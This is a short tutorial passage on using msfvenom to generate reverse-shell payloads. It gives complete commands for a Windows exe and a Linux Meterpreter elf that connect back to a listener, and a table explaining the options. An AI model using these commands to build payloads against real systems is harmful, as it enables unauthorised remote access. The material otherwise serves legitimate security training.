Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`).

The standard syntax for msfvenom is as follows:

```
msfvenom -p <PAYLOAD> <OPTIONS>
```

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

To generate a Linux x64 Meterpreter Reverse Shell in elf format, we could use:

```
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
```

Here we are using a payload and four options:

|Operator||
|---|---|
|```-f <format>```|Specifies the output format. In this case that is an executable (exe)|
|```-o <file>```|The output location and filename for the generated payload.|
|```LHOST=<IP>```|Specifies the IP to connect back to.|
|```LPORT=<port>```| The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.|